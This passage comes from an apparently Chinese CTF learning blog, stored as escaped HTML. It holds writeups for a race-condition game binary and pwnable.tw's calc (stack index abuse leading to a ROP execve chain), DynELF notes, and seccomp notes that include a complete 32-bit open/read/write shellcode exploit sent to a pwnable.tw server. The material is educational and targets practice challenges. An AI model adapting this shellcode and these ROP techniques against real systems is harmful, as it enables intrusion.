<span class=\"comment\">// init kill type</span></span><br><span class=\"line\">  write(fd, gHero, <span class=\"number\">0x54</span>u);                      <span class=\"comment\">// write gHero &#x27; content to fd</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> close(fd);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以及这个<code>init_db(name);</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">struct_gHero *__cdecl <span class=\"title\">init_db</span><span class=\"params\">(<span class=\"keyword\">char</span> *file)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  struct_gHero *result; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  gfd = open(file, <span class=\"number\">2</span>);                          <span class=\"comment\">// open &quot;name&quot;</span></span><br><span class=\"line\">  result = (struct_gHero *)mmap(<span class=\"number\">0</span>, <span class=\"number\">0x1000</span>u, <span class=\"number\">3</span>, <span class=\"number\">1</span>, gfd, <span class=\"number\">0</span>);<span class=\"comment\">// re_init gHero</span></span><br><span class=\"line\">  gHero = result;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里将gHero mmap到了这个0x1000的地方,也就是这一块内存是共享的，这就意味着如果不同进程同时访问的话就有可能造成条件竞争。</p>\n<p>​        重新整理一下，如果需要打败monster，需要<code>gMonster-&gt;surplus</code>小于0，也就是<code>mon_skill_2 &lt; hero_skill_1</code>，也就是<code>*(gMonster-&gt;methods + 16)&lt;*gHero[5].kill_type;</code></p>\n<p>​        这<code>*gHero[5].kill_type;</code>就是那个ddos。</p>\n<p>​        如果正常打的话，可以赢两把，但是第三把monster的伤害和血量都会大大提高，所以正常操作必死无疑。</p>\n<p>​    <code>hero_skill_1</code>是某个数值，那么如果同时运行两个程序，并且用户名相同，则会利用同一块<code>gHero</code>的内存空间。</p>\n<p>​        所以如果我们注册两个name，在name1询问是否使用隐藏技能的时候，修改name2的隐藏技能点，使得这个技能点数大于怪兽的点数，就能够一直打败怪兽。</p>\n<p>​    </p>\n<p>​        直接点开<code>kill_type</code>地址，可以发现是一排这样的：</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-11-01%20%E4%B8%8B%E5%8D%881.43.04.png\" alt=\"截屏2022-11-01 下午1.43.04\"></p>\n<p>将类型转换为dd</p>\n<p><img src=\"/Users/rin/Library/Application Support/typora-user-images/截屏2022-11-01 下午1.43.53.png\" alt=\"截屏2022-11-01 下午1.43.53\"></p>\n<p>​        可以看到地址对应了一堆字符串的指针，我们的<code>*gHero[5].kill_type</code>非常明显是开头这个dd 19h。</p>\n<p>​        所以这个技能的无论是展示也好，切换也好，就是通过这里。</p>\n<p>​        切换技能时:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">result = read_int();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( result &lt;= <span class=\"number\">3</span> )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  result = <span class=\"number\">20</span> * result + <span class=\"number\">0x804B0C0</span>;           <span class=\"comment\">// g_hero_kill_type + 20 * result</span></span><br><span class=\"line\">  gHero[<span class=\"number\">5</span>].kill_type = result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<p>找到这个对应地址，每20个字节对应一种技能的描述。在技能选择ddos的情况下，<code>gHero[5].kill_type + 4</code>是<code>12</code>。</p>\n<p>由于每个回合都会回复血量，所以只是从程序来看其实挺迷惑的。</p>\n<p>大概就是几个技能，技能三是回血，所以如果在io1使用技能三点隐藏技能时利用io2修改其点数，就能造成hero血量增加，monster血量减少。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">change_skill(io1, <span class=\"number\">3</span>)  </span><br><span class=\"line\">attack(io1)  </span><br><span class=\"line\">change_skill(io2,<span class=\"number\">1</span>)  </span><br><span class=\"line\">use_hide(io1, <span class=\"number\">1</span>)  </span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["Race Condition"]},{"title":"pwnable-calc","url":"/2021/11/18/stack_challenge_pwnable-calc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-TwFwowGZ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h3><span id=\"逆向\">逆向</span></h3><p>​        程序实现了一个简单的计算器功能。运算有加减乘除四种。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-18%20%E4%B8%8A%E5%8D%8810.33.21.png\" alt=\"截屏2021-11-18 上午10.33.21\"></p>\n<p>​        并且程序再次自带计时功能，需要patch。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-20%20%E4%B8%8A%E5%8D%889.57.37.png\" alt=\"截屏2021-11-20 上午9.57.37\"></p>\n<p>​        静态链接，所以肯定不能用ret2libc那一套，只能试图ROP一下。</p>\n<p>​        程序主要功能通过<code>get_expr</code>和<code>calculate</code>（原本不叫这个）两个函数实现。</p>\n<p>​        <code>get_expr</code>主要用于定位我们输入的字符串中运算符的位置。修改过的ida伪代码如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">get_expr</span><span class=\"params\">(<span class=\"keyword\">int</span> input_str, <span class=\"keyword\">int</span> _1024)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> idx_0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> <span class=\"keyword\">operator</span>; <span class=\"comment\">// [esp+1Bh] [ebp-Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( i &lt; _1024 &amp;&amp; read(<span class=\"number\">0</span>, &amp;<span class=\"keyword\">operator</span>, <span class=\"number\">1</span>) != <span class=\"number\">-1</span> &amp;&amp; <span class=\"keyword\">operator</span> != <span class=\"string\">&#x27;\\n&#x27;</span> ) <span class=\"comment\">//栈溢出</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;+&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;%&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> &gt; <span class=\"string\">&#x27;/&#x27;</span> &amp;&amp; <span class=\"keyword\">operator</span> &lt;= <span class=\"string\">&#x27;9&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      idx_0 = i++;</span><br><span class=\"line\">      *(_BYTE *)(input_str + idx_0) = <span class=\"keyword\">operator</span>; <span class=\"comment\">// 通过循坏找到运算符的位置</span></span><br><span class=\"line\">                                                 </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *(_BYTE *)(i + input_str) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i;</span><br></pre></td></tr></table></figure>\n<p>​        在这之后还有一个<code>init_pool</code>函数。函数参数为表达式数组的索引。大致就是初始化一个大小的100的字符串数组。</p>\n<p>​        <code>calculate</code>函数则负责进行运算。    </p>\n<p>​        实在是没有思路，于是找到了wp。不得不说pwnable.tw上面的题目每个都出得很好，几乎没有板子题，而且漏洞点都丝毫不传统。</p>\n<p>​        主要的问题还是在这个运算的逻辑上</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">DWORD *__cdecl <span class=\"title\">eval</span><span class=\"params\">(_DWORD *num, <span class=\"keyword\">char</span> <span class=\"keyword\">operator</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  _DWORD *result; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;+&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    num[*num - <span class=\"number\">1</span>] += num[*num];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> &gt; <span class=\"string\">&#x27;+&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;-&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      num[*num - <span class=\"number\">1</span>] -= num[*num];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;/&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      num[*num - <span class=\"number\">1</span>] /= num[*num];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;*&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    num[*num - <span class=\"number\">1</span>] *= num[*num];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = num;</span><br><span class=\"line\">  --*num;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        这里<code>*num</code>，也就是<code>num[0]</code>的值，是检测到的表达式中数字的数量。</p>\n<p>​        比如我输入了1+2，那么，num[0]的值为2，如果输入+2，num[0]的值为1。</p>\n<p>​        所以根据这个计算的逻辑，如果输入+50，num[0]是1，num[1]是50，num[*num-1]就是num[1-1] = num[0] = num[0] + num[1]=50。</p>\n<p>​        如果输入的是+50+1，处理第一个加号时，num[0] = 2,num[1] = 50 ,num[2].= 1，</p>\n<p>然后num[1] += num[2] =&gt; num[1] = 51，接着处理第二个加号，也就是,num[50] += num[51]。</p>\n<p>​        num[51]显然应该是一个栈上的还没有被利用到的位置，但是这样我们已经能够将其覆盖为任意内容了，四舍五入形成了一个栈上任意地址读。</p>\n<p>​        然后后面还有一个对数组的内容的输出，相当于栈上任意地址写。</p>\n<p>​        这样我们就找到了不通过栈溢出而对栈上地址进行任意读写的方法，但想要控制程序执行流，我们注意到，存放进行计算的数字的数组不算很大，完全能够填写东西覆盖返回地址。</p>\n<p>​        </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%8811.57.33.png\" alt=\"截屏2021-12-02 下午11.57.33\"></p>\n<p>​            </p>\n<p>​        </p>\n<p>​        也就是0x5A0 + 0x4 = 0x5A4 = 1444。数组存放int类型，32位下一个int占4个字节，所以返回地址所在的位置是idx[1444/4=361]</p>\n<p>​        也就是说如果我们能够将想要的东西写入idx[361]就能控制程序执行流。但是并不能ret2libc，所以需要在栈上手动构造寄存器状态来进行系统调用。</p>\n<p>​        所以我们需要的并不是在idx[361]上填某个值，而是需要连续修改这之后一串的空间来进行rop。</p>\n<p>​        借一张图来表示我们需要的布栈状况：</p>\n<p>​        <img src=\"https://v1ckydxp.github.io/images/stack.jpg\" alt=\"stack\"></p>\n<p>​        </p>\n<p>​        其他的gadgets都可以通过ROPgadget来找到，但是字符串<code>&quot;/bin/sh&quot;</code>需要输入并确定它们在栈上的地址。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8812.45.13.png\" alt=\"截屏2021-12-03 上午12.45.13\"></p>\n<p>​    </p>\n<p>​        对于这个地址，首先我们可以利用我们之前的栈上任意地址读写的能力泄露calc函数的ebp地址，也即是idx[360]    ,但是我们需要的字符串是在main函数调用栈中的，所以我们需要知道main函数调用栈的esp。</p>\n<p>​        通过观察可以发现main的esp正好就是idx[361],而calc ebp和main esp的关系如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tmov     ebp, esp</span><br><span class=\"line\"> and     esp, 0FFFFFFF0h</span><br><span class=\"line\">sub     esp, 10h</span><br></pre></td></tr></table></figure>\n<p>​        也即是我们可以通过calc ebp的值来求出main esp，从而通过偏移获得<code>&quot;/bin/sh&quot;</code>的地址。</p>\n<p>​        然后根据布栈将地址依次写入栈中就行。</p>\n","categories":["Binary_security"],"tags":["STACK - ROP"]},{"title":"DynELF学习","url":"/2022/03/16/stack_learning_DynELF/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-dHAfINiQ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h3><span id=\"0\">0</span></h3><p>​        我发现我居然还不太会用这个东西，可以用不上，但是不能不会。</p>\n<h4><span id=\"1\">1</span></h4><p>​        DynELF的意义在于当我们无法找到目标libc中具体的符号偏移时，可以利用它来搜索内存中的函数地址,而不需要再通过libc来获取。</p>\n<h5><span id=\"如何使用\">如何使用？</span></h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwnme&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Declare a function that takes a single address, and</span></span><br><span class=\"line\"><span class=\"comment\"># leaks at least one byte at that address.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span>(<span class=\"params\">address</span>):</span></span><br><span class=\"line\">    data = p.read(address, <span class=\"number\">4</span>)</span><br><span class=\"line\">    log.debug(<span class=\"string\">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class=\"keyword\">or</span> <span class=\"string\">&#x27;&#x27;</span>).encode(<span class=\"string\">&#x27;hex&#x27;</span>)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># For the sake of this example, let&#x27;s say that we</span></span><br><span class=\"line\"><span class=\"comment\"># have any of these pointers.  One is a pointer into</span></span><br><span class=\"line\"><span class=\"comment\"># the target binary, the other two are pointers into libc</span></span><br><span class=\"line\">main   = <span class=\"number\">0xfeedf4ce</span></span><br><span class=\"line\">libc   = <span class=\"number\">0xdeadb000</span></span><br><span class=\"line\">system = <span class=\"number\">0xdeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># With our leaker, and a pointer into our target binary,</span></span><br><span class=\"line\"><span class=\"comment\"># we can resolve the address of anything.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># We do not actually need to have a copy of the target</span></span><br><span class=\"line\"><span class=\"comment\"># binary for this to work.</span></span><br><span class=\"line\">d = DynELF(leak, main)</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"literal\">None</span>,     <span class=\"string\">&#x27;libc&#x27;</span>) == libc</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"string\">&#x27;system&#x27;</span>, <span class=\"string\">&#x27;libc&#x27;</span>) == system</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># However, if we *do* have a copy of the target binary,</span></span><br><span class=\"line\"><span class=\"comment\"># we can speed up some of the steps.</span></span><br><span class=\"line\">d = DynELF(leak, main, elf=ELF(<span class=\"string\">&#x27;./pwnme&#x27;</span>))</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"literal\">None</span>,     <span class=\"string\">&#x27;libc&#x27;</span>) == libc</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"string\">&#x27;system&#x27;</span>, <span class=\"string\">&#x27;libc&#x27;</span>) == system</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Alternately, we can resolve symbols inside another library,</span></span><br><span class=\"line\"><span class=\"comment\"># given a pointer into it.</span></span><br><span class=\"line\">d = DynELF(leak, libc + <span class=\"number\">0x1234</span>)</span><br><span class=\"line\"><span class=\"keyword\">assert</span> d.lookup(<span class=\"string\">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure>\n<p>​            </p>\n<p>​        大致描述一下，就是先用<code>leak()</code>函数按照原本ret2xx的方法用stdout函数来打印addr的数据，然后</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">d = DynELF(leak, main)</span><br><span class=\"line\">system_addr = d.lookup(<span class=\"string\">&#x27;system&#x27;</span>, <span class=\"string\">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​        来找到system的地址。</p>\n<h5><span id=\"原理\">原理？</span></h5><p>​        这个module其实非常好用，指不知道原理也能用。</p>\n<p>​        DynELF泄露地址的过程原理通常分为两步，首先通过暴力对比找到libc的内存加载基址。</p>\n<p>​        在找libc之前还需要找到elf文件在内存中的加载基址。</p>\n<h6><span id=\"寻找elf文件加载基址\">寻找elf文件加载基址</span></h6><p>​        基地址内存页起始的字符串为<code>\\0x7fELF</code>，所以可以指定内存中的地址，然后对地址进行页对齐，再与当前内存页起始字符串进行对比，如果不符合则不断与更低地址内存页的起始字符串对比，直到找到。</p>\n<h6><span id=\"寻找glibc加载基址\">寻找glibc加载基址</span></h6><p>​        efl在内存中有一个叫做<code>link_map</code>的双向链表，在学习ret2dl的时候遇见过，大致是指向elf的一些表项相关数据结构的链表。</p>\n<p>​        对于如何找到<code>link_map</code>    ,一般来说有两种方式，在full relro以外的elf中，可以在<code>Dynamic</code>段的<code>.got.plt</code>节中找到，对于启用full relro的elf，可以在<code>Dynamic</code>段的<code>DT_DEBUG</code>中找到。</p>\n<p>​        <code>Dynamic</code>段的地址则需要通过ELF文件的段表得到，由于我们已经获得了ELF的内存基地址，所以也能得到段表的地址。</p>\n<h6><span id=\"在libc中寻找hash表动态符号表与字符串表基地址\">在libc中寻找hash表，动态符号表与字符串表基地址</span></h6><p>​        通过上面两步我们已经获得了libc的基地址，因此很容易得到所有与函数相关的hash表，动态符号表以及字符串表的基地址。最后，可以通过hash表得到system的地址。</p>\n<p>​        </p>\n<h4><span id=\"参考\">参考</span></h4><p>​    <a href=\"https://www.freebuf.com/articles/system/193646.html\">Pwntools之DynELF原理探究</a></p>\n<p>​        </p>\n<p>​    <a href=\"https://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html\">Finding Function’s Load Address</a></p>\n","categories":["Binary_security"],"tags":["STACK - DynELF"]},{"title":"Seccomp机制学习","url":"/2021/11/11/stack_learning_Seccomp%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-DMnvaICf\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>   \n<h2><span id=\"1seccomp基础\">1）Seccomp基础</span></h2><h3><span id=\"seccomp简介\">Seccomp简介</span></h3><p>​        就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。</p>\n<h3><span id=\"启动seccomp\">启动Seccomp</span></h3><p>​        如果要编写调用Seccomp的程序，需要先安装相应的头文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></figure>\n<p>Seccomp的模式以及参数比较多，这里只总结比较直观的几点，具体的可以看大佬的博客：<a href=\"https://a1ex.online/2020/09/27/seccomp学习笔记/\">seccomp学习笔记</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tscmp_filter_ctx ctx;</span><br><span class=\"line\"></span><br><span class=\"line\">\tctx = seccomp_init(SCMP_ACT_ALLOW);<span class=\"comment\">/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数）</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">seccomp_load(ctx);<span class=\"comment\">//调用，使过滤规则生效</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2><span id=\"2seccomp-tools\">2）Seccomp-Tools</span></h2><p>​        暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。</p>\n<h2><span id=\"3orw例题\">3）ORW例题</span></h2><h3><span id=\"pwnable-orw\">pwnable-orw</span></h3><p>​        pwnable第二题，orw。 </p>\n<p>​    </p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%889.41.28.png\" alt=\"截屏2021-11-15 下午9.41.28\"></p>\n<p>​        这里的沙箱实际是通过prctl来控制实现的。</p>\n<blockquote>\n<p>(1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图)</p>\n<p>(2).PR_SET_NO_NEWPRIVS(38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数继承给子进程</p>\n<p>copy的宋师傅的博客捏</p>\n</blockquote>\n<p>​        所以这道题就是一道没有任何坑的orw，我们需要做的就是手写shellcode。</p>\n<p>​        参照我之前qwb那道orw的wp，为了读取到flag，我们的步骤如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">sys_open(<span class=\"string\">&quot;flag&quot;</span>)<span class=\"comment\">//读取flag</span></span><br><span class=\"line\">sys_read(<span class=\"string\">&quot;eax&quot;</span>,<span class=\"string\">&quot;esp&quot;</span>,<span class=\"number\">0x40</span>)<span class=\"comment\">//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下</span></span><br><span class=\"line\">sys_write(<span class=\"number\">1</span>,<span class=\"string\">&quot;esp&quot;</span>,<span class=\"number\">0x40</span>)<span class=\"comment\">//打印flag的值到屏幕输出</span></span><br></pre></td></tr></table></figure>\n<p>​        如果要达到可以成功执行的效果，就必须要像写完整汇编一样将所有压栈出栈等对栈顶的操作也考虑进去。</p>\n<p>​        手写汇编要尤其注意32位与64位系统传参规则并不相同。尤其是函数使用的寄存器的种类理论上是特定的，如果搞错就直接EOF了。</p>\n<p>​        并且进行软中断时使用的指令是<code>int 0x80</code>而不是<code>syscall</code>，<code>syscall</code>是c语言层面上的系统调用，而<code>int 0x80</code>才是汇编层面的系统调用。</p>\n<p>​        关于pwntools的asm模块，有一些比较怪的点。</p>\n<p>​        比如说我们可以这样写：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload =  asm(<span class=\"string\">&quot;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">也可以这样写</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">asm(<span class=\"string\">&#x27;mov eax, 0&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>​        就是说，可以有分号，也可以没有。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./orw&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;chall.pwnable.tw&quot;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#open</span></span><br><span class=\"line\">payload =  asm(<span class=\"string\">&quot;push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#read</span></span><br><span class=\"line\">payload += asm(<span class=\"string\">&quot;mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#write</span></span><br><span class=\"line\">payload += asm(<span class=\"string\">&quot;mov eax, 0x4;mov ebx, 0x1;int 0x80;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​        完整exp，其实主要是要对32位的传参熟悉，整体编写的难度并不高捏。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-17%20%E4%B8%8B%E5%8D%8810.28.54.png\" alt=\"截屏2021-11-17 下午10.28.54\">        </p>\n<h2><span id=\"4参考\">4）参考</span></h2><p>prctl函数开始学习沙箱规则](<a href=\"https://www.cnblogs.com/L0g4n-blog/p/12839171.html\">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</a>)</p>\n","categories":["Binary_security"],"tags":["STACK - sandbox"]},{"title":"格式化字符串","url":"/2022/03/19/stack_learning_fmt/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-xhgYpbMU\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h1><span id=\"1前言\">1）前言</span></h1><p>​        绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>\n<p>​        首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>\n<p>​        所以碰到这道题，算是又给我敲了第nn个警钟。</p>\n<p>​        非常清晰地告诉我：我是垃圾。</p>\n<h1><span id=\"2格式化字符串基本原理\">2）格式化字符串基本原理</span></h1><p>​        ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>\n<h3><span id=\"格式化字符串参数\">格式化字符串参数</span></h3><figure class=\"highlight 